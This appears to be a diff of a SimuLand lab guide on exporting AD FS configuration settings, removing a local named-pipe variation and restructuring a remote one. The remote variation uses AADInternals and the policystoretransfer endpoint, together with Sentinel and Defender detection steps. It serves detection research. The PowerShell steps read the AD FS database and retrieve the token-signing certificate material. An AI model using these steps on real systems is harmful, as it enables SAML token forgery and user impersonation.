@@ -1,131 +1,8 @@
-# Export Active Directory Federation Services (AD FS) Configuration Settings
+# Export Active Directory Federation Services (AD FS) Configuration Settings via Policy Store Transfer Service
 
 The AD FS configuration settings contains properties of the Federation Service and can be stored in either a Microsoft SQL server database or a `Windows Internal Database (WID)`. You can choose either one, but not both. The `SimuLand` project uses a `WID` as the AD FS configuration database.
 
-## Simulate & Detect
-
-**[Local Variations](#local-variations):**
-
-* [Named Pipe Connection and AD FS SQL Statement](#named-pipe-connection-and-ad-fs-sql-statement)
-    * [Detect Named Pipe Connection](#detect-named-pipe-connection)
-    * [Detect AD FS SQL Statement to Export Service Settings](#detect-ad-fs-sql-statement-to-export-service-settings)
-
-**[Remote Variations](#remote-variations):**
-
-* [AD FS Synchronization](#ad-fs-synchronization)
-    * [Detect AD FS Remote Synchronization Network Connection](#detect-ad-fs-remote-synchronization-network-connection)
-    * [Active Directory Replication Services](#detect-active-directory-replication-services)
-
-## Local Variations
-
-## Named Pipe Connection and AD FS SQL Statement
-
-### Preconditions
-* Endpoint: AD FS Server (ADFS01)
-    * Authorization:
-        * AD FS Service Account
-        * Local Administrator
-    * Services Running:
-        * Active Directory Federation Services (ADFSSRV)
-
-### Get Database Connection String via WMI Class
-
-Locally, the AD FS WID does not have its own management user interface (UI), but one could connect to it via a specific `named pipe`. The named pipe information can be obtained directly from the `ConfigurationDatabaseConnectionString` property of the `SecurityTokenService` class from the WMI `ADFS namespace`.
-
-1.  Connect to the AD FS server (ADFS01) via the [Azure Bastion service](../../2_deploy/_helper_docs/connectAzVmAzBastion.md) as the AD FS service account.
-2.  Open PowerShell and run the following commands:
-
-```PowerShell
-$ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService
-$conn = $ADFS.ConfigurationDatabaseConnectionString
-$conn
-```
-
-![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_02_get_database_string_wmi_class.png)
-
-### Connect to the database and run a SQL statement to read configuration
-
-3. Use the connection string to connect to the AD FS database (WID) and run a SQL `SELECT` statement to export its configuration settings from the `IdentityServerPolicy.ServiceSettings` table.
-
-```PowerShell
-$SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn
-$SQLclient.Open()
-$SQLcmd = $SQLclient.CreateCommand()
-$SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"
-$SQLreader = $SQLcmd.ExecuteReader()
-$SQLreader.Read() | Out-Null
-$settings=$SQLreader.GetTextReader(0).ReadToEnd()
-$SQLreader.Dispose()
-$settings
-```
-
-![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_03_get_database_configuration.png)
-
-## Detect Named Pipe Connection
-
-The connection to the AD FS database occurs via the `\\.\pipe\microsoft##wid\tsql\query` named pipe, and we could monitor for the connection to it with `Sysmon Event ID 18 (Pipe Connected)`.
-
-![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_04_event_sample.png)
-
-### Azure Sentinel Detection Rules
-
-* [AD FS Database Named Pipe Connection Rule](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSDBNamedPipeConnection.yaml)
-
-## Detect AD FS SQL Statement to Export Service Settings
-
-If we want to monitor for anyone interacting with the WID database via SQL statements, we would need to [create a server audit and database audit specification](https://docs.microsoft.com/en-us/sql/relational-databases/security/auditing/create-a-server-audit-and-database-audit-specification?view=sql-server-ver15). We can use the [Microsot SQL Server PowerShell module](https://docs.microsoft.com/en-us/powershell/module/sqlserver/?view=sqlserver-ps) to connect to the database and create audit rules.
-
-### Create SQL Audit Rules
-
-1.  On the AD FS server (ADFS01), open PowerShell as Administrator.
-2.  Install the SqlServer PowerShell Module.
-
-```PowerShell
-Install-Module -Name SqlServer
-Import-module SqlServer
-```
-
-3.  Create SQL Audit Rules.
-
-```PowerShell
-Invoke-SqlCmd -ServerInstance '\\.\pipe\microsoft##wid\tsql\query' -Query "
-USE [master]
-GO
-CREATE SERVER AUDIT [ADFS_AUDIT_APPLICATION_LOG] TO APPLICATION_LOG WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE)
-GO
-ALTER SERVER AUDIT [ADFS_AUDIT_APPLICATION_LOG] WITH (STATE = ON)
-GO
-USE [ADFSConfigurationV4]
-GO
-CREATE DATABASE AUDIT SPECIFICATION [ADFS_SETTINGS_ACCESS_AUDIT] FOR SERVER AUDIT [ADFS_AUDIT_APPLICATION_LOG] ADD (SELECT, UPDATE ON OBJECT::[IdentityServerPolicy].[ServiceSettings] BY [public])
-GO
-ALTER DATABASE AUDIT SPECIFICATION [ADFS_SETTINGS_ACCESS_AUDIT] WITH (STATE = ON)
-GO
-"
-```
-
-4.  Validate SQL Audit rule by running previous simulation steps either as the AD FS service account or local administrator:
-* [Get Database Connection String via WMI Class](#get-database-connection-string-via-wmi-class)
-* [Connect to database and run SQL statement to read configuration](#connect-to-database-and-run-sql-statement-to-read-configuration)
-
-![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_04_adfs_sql_event_sample.png)
-
-### Azure Sentinel Hunting Queries
-
-* [AD FS Database Local SQL Statements Rule](https://github.com/Azure/Azure-Sentinel/blob/master/Hunting%20Queries/SecurityEvent/ADFSDBLocalSqlStatements.yaml)
-
-## Remote Variations
-
-## AD FS Synchronization
-
-### Preconditions
-* Endpoint: Workstation (WORKSTATION6)
-    * Authorization: Domain Administrator
-    * Libraries Installed: [AADInternals](https://github.com/Gerenios/AADInternals)
-* Endpoint: AD FS Server (ADFS01)
-    * Authorization: AD FS Service Account
-    * Services Running: Active Directory Federation Services (ADFSSRV)
-    * Network Ports Open: 80
+The AD FS configuration settings contains sensitive information such as the AD FS token signing certificate (encrypted format) which can be exported and decrypted to sign SAML tokens and impersonate users in a hybrid environment.
 
 Based on [recent research](https://o365blog.com/post/adfs/) by [Dr. Nestori Syynimaa](https://twitter.com/DrAzureAD), a threat actor could use [AD FS synchronization (Replication services)](https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-the-ad-fs-configuration-database#how-the-adfs-configuration-database-is-synchronized) and pretend to be a secondary federation server to retrieve the AD FS configuration settings remotely from the primary federation server. 
 
@@ -135,14 +12,38 @@ Legitimate secondary federation servers store a `read-only` copy of the AD FS co
 http://<AD FS Server Name>:80/adfs/services/policystoretransfer
 ```
 
+## Table of Contents
+
+* [Preconditions](#preconditions)
+* [Simulation Steps](#simulation-steps)
+* [Detection](#detection)
+* [Output](#output)
+* [Variations](#variations)
+
+## Preconditions
+* Integrity level: medium
+* Authorization:
+    * Resource: AD FS Database 
+    * Identity:
+        * AD FS Service Account
+        * Local Administrator
+* AD FS Server
+    * Services:
+        * Active Directory Federation Services (ADFSSRV)
+    * Network:
+        * URL: `http://<adfs server name>:80/adfs/services/policystoretransfer`
+        * Port: 80
+
+## Simulation Steps
+
 For this remote variation, we can use use [AADInternals](https://github.com/Gerenios/AADInternals) with the following information:
-* IP Address or FQDN of the AD FS server (ADFS01)
+* IP Address or FQDN of the AD FS server
 * NTHash of the AD FS service account
 * SID of the AD FS service account 
 
 ### Log onto a domain joined workstation
 
-1.  Connect to one of the domain joined workstations in the network (WORKSTATION6) via the [Azure Bastion service](../../2_deploy/_helper_docs/connectAzVmAzBastion.md) as a [domain admin account](https://github.com/Azure/SimuLand/tree/main/2_deploy/aadHybridIdentityADFS#domain-users-information) (e.g. pgustavo).
+1.  Connect to one of the domain joined workstations in the network via the [Azure Bastion service](../../2_deploy/_helper_docs/connectAzVmAzBastion.md) as a [domain admin account](https://github.com/Azure/SimuLand/tree/main/2_deploy/aadHybridIdentityADFS#domain-users-information) (e.g. pgustavo).
 
 ### Get Object GUID and SID of the AD FS Service Account
 
@@ -167,7 +68,7 @@ $Object | Format-List
 4.  On the same elevated PowerShell session, run the following commands to install [AADInternals](https://github.com/Gerenios/AADInternals) if it is not installed yet: 
 
 ```PowerShell
-Install-Module –Name AADInternals –RequiredVersion 0.4.8 -Force 
+Install-Module –Name AADInternals -Force 
 Import-Module –Name AADInternals 
 ```
 
@@ -197,7 +98,9 @@ $settings
 
 ![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_07_get_adfs_settings_remotely.png)
 
-## Detect AD FS Remote Synchronization Network Connection
+## Detection
+
+### Detect AD FS Remote Synchronization Network Connection
 
 The replication channel used to connect to the AD FS server is over `port 80`. Therefore, we can monitor for incoming network traffic to the AD FS server over HTTP with `Sysmon event id 3 (NetworkConnect)`. For an environment with only one server in the AD FS farm, it is rare to see incoming connections over standard HTTP port from workstations in the network.
 
@@ -207,16 +110,16 @@ Another behavior that we could monitor is the `authorization check` enforced by 
 
 ![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_09_adfs_remote_connection_adfsauditing.png)
 
-### Azure Sentinel Detection Rules
+#### Azure Sentinel Detection Rules
 
 * [AD FS Remote HTTP Network Connection](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSRemoteHTTPNetworkConnection.yaml)
 * [AD FS Remote Auth Sync Connection](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/ADFSRemoteAuthSyncConnection.yaml)
 
-## Detect Active Directory Replication Services
+### Detect Active Directory Replication Services
 
 Even though the use of directory replication services (DRS) is not part of the core behavior to extract the AD FS configuration settings remotely, it is an additional step taken by tools such as [AADInternals](https://github.com/Gerenios/AADInternals) to get the NTHash of the AD FS user account to access the AD FS database remotely.
 
-### Microsoft Defender for Identity Alerts
+#### Microsoft Defender for Identity Alerts
 
 **Suspected DCSync attack (replication of directory services)**
 
@@ -227,7 +130,7 @@ The Microsoft Defender for Identity (MDI) sensor, installed on the domain contro
 
 ![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_10_m365_mdi_alert_dcsync.png)
 
-### Microsoft Cloud Application Security Alerts
+#### Microsoft Cloud Application Security Alerts
 
 **Suspected DCSync attack (replication of directory services)**
 
@@ -239,10 +142,10 @@ You can also see the same alert in the Microsoft Cloud Application Security (MCA
 ![](../../resources/images/simulate_detect/credential-access/exportADFSTokenSigningCertificate/2021-05-19_11_m365_mcas_alert_dcsync.png)
 
 ## Output
+* AD FS Configuration Settings
 
-Whether you export the AD FS configuration settings locally or remotey, you can use the variable `$settings` for the following steps:
-* [Extract AD FS Token Signing Certificate](extractADFSTokenSigningCertificate.md)
-* [Get the Path of the AD FS DKM Container](getADFSDKMContainerADPath.md).
+## Variations
+* [Export AD FS Configuration Settings Locally via Named Pipe](exportADFSConfigSettingsNamedPipe.md)
 
 ## References
 * [Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)](https://o365blog.com/post/adfs/)
